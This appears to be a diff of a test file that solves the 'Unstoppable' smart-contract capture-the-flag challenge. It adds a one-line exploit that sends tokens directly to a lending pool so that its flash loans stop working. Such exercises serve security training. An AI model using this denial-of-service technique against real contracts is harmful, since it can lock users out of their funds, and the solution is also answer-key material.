@@ -40,10 +40,14 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
+
 
         // It is no longer possible to execute flash loans
         await expect(
